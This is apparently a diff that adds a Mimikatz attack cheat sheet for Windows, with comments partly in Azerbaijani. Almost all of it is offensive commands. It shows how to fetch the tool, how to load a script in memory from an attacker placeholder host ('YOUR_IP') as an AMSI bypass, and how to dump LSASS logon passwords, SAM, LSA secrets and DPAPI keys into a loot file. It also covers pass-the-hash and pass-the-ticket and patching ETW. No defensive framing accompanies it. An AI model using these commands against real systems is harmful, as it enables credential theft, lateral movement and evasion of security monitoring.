@@ -1,1 +1,67 @@
+# GitHub-dan
+git clone https://github.com/gentilkiwi/mimikatz.git
+cd mimikatz
 
+# Release (hazır)
+Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile mimikatz.zip
+
+# AMSI Bypass + Load
+IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/mimikatz.ps1')
+
+=======================================================================================================================================================================
+
+# Admin PowerShell olaraq
+mimikatz.exe
+
+# Reflective DLL
+rundll32.exe .\mimikatz.dll,xSekurlsa
+
+=======================================================================================================================================================================
+
+privilege::debug
+sekurlsa::logonpasswords
+
+sekurlsa::pth /user:Administrator /domain:. /ntlm:30B3783CE2ABF1AF70F77D0660CF3453 /run:"cmd.exe"
+kerberos::list
+kerberos::ptt C:\ticket.kirbi
+lsadump::sam
+lsadump::secrets
+dpapi::masterkey /in:"%appdata%\Microsoft\Protect"
+crypto::capi
+misc::cmd
+
+1. privilege::debug
+2. sekurlsa::logonpasswords          # Hər şeyi al
+3. lsadump::sam                     # SAM dump
+4. lsadump::secrets                 # LSA secrets
+5. kerberos::list                   # Tickets
+
+# Plaintext
+sekurlsa::logonpasswords
+
+# Yalnız hash
+sekurlsa::logonpasswords /patch
+
+# Specific user
+sekurlsa::logonpasswords /user:Administrator
+
+# All to file
+sekurlsa::logonpasswords > loot.txt
+
+# Base64
+misc::base64
+
+# No LSASS touch
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords /in:lsass.dmp
+
+# Patch ETW
+misc::patch
+
+=====================================================================================================================================================================
+
+# Quick dump
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > loot.txt
+
+# PTH spawn
+mimikatz.exe "sekurlsa::pth /user:admin /domain:. /ntlm:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe" "exit"
